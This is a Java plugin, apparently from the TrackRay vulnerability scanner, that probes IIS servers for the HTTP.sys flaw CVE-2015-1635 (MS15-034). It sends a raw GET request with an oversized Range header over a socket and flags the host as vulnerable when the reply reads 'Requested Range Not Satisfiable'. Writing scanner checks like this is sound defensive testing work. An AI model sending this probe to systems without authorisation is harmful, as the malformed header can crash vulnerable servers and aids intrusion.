package com.trackray.module.poc;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.bean.Result;
import com.trackray.base.bean.Task;
import com.trackray.base.bean.Vulnerable;
import com.trackray.base.enums.WEBServer;
import com.trackray.base.plugin.AbstractPOC;
import com.trackray.base.utils.IOUtils;
import com.trackray.base.utils.SysLog;
import org.apache.commons.lang3.StringUtils;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URL;
import java.util.Arrays;
import java.util.concurrent.Callable;
import java.util.concurrent.FutureTask;
import java.util.concurrent.TimeUnit;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/6/25 13:07
 */
@Plugin(title = "HTTP.sys远程执行代码漏洞" , desc = "CVE-2015-1635，MS15-034" , author ="浅蓝" ,link = "https://github.com/Zx7ffa4512-Python/Project-CVE-2015-1635")
public class HttpSysRCE extends AbstractPOC {

    @Override
    public void attack(Task task) {

        try {
            URL url = new URL(getTarget());
            String host = url.getHost();
            int port = url.getPort();

            Socket socket = new Socket(host,port);

            Callable<String> callable = new Callable<String>() {
                @Override
                public String call() throws Exception {
                    String hexAllFfff = "18446744073709551615";
                    String req = "GET / HTTP/1.0\r\nHost: " + host + "\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n";

                    InputStream inputStream = socket.getInputStream();
                    OutputStream outputStream = socket.getOutputStream();

                    outputStream.write(req.getBytes());
                    outputStream.flush();

                    String response = IOUtils.analysisStream(inputStream);

                    return response;
                }
            };

            FutureTask<String> futureTask = new FutureTask<>(callable);
            futureTask.run();
            try {
                String result = futureTask.get(30, TimeUnit.SECONDS);
                if (StringUtils.contains(result,"Requested Range Not Satisfiable")){
                    addVulnerable(
                            Vulnerable.builder()
                                    .title("HTTP.sys 远程代码执行")
                                    .address(getTarget())
                                    .level(Vulnerable.Level.HIGH.getLevel())
                                    .type(Vulnerable.Type.CODE_EXECUTION.getType())
                                    .vulnId(Arrays.asList("CVE-2015-1635","MS15-034"))
                                    .build()
                    );

                }
            }catch (Exception e){
                Socket newSocket = new Socket(host,port);

                callable = new Callable<String>() {
                    @Override
                    public String call() throws Exception {
                        String hexAllFfff = "18446744073709551615";
                        String req = "GET / HTTP/1.1\r\nHost: " + host + "\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n";

                        InputStream inputStream = newSocket.getInputStream();
                        OutputStream outputStream = newSocket.getOutputStream();

                        outputStream.write(req.getBytes());
                        outputStream.flush();

                        String response = IOUtils.analysisStream(inputStream);

                        return response;
                    }
                };

                futureTask.cancel(true);
                futureTask = new FutureTask<>(callable);
                futureTask.run();
                try {
                    String result = futureTask.get(30, TimeUnit.SECONDS);
                    if (StringUtils.contains(result, "Requested Range Not Satisfiable")) {
                        addVulnerable(
                                Vulnerable.builder()
                                        .title("HTTP.sys 远程代码执行")
                                        .address(getTarget())
                                        .level(Vulnerable.Level.HIGH.getLevel())
                                        .type(Vulnerable.Type.CODE_EXECUTION.getType())
                                        .vulnId(Arrays.asList("CVE-2015-1635","MS15-034"))
                                        .build()
                        );
                    }
                }catch (Exception ee){
                }finally {
                    futureTask.cancel(true);
                    newSocket.close();
                }


            }finally {
                socket.close();
            }


        } catch (Exception e) {
            SysLog.error(e);
        }



    }

    @Override
    public boolean check(Result result) {
        return Arrays.asList(WEBServer.IIS7,WEBServer.IIS6,WEBServer.IIS8).contains(result.getSystemInfo().getWebServer());
    }
}
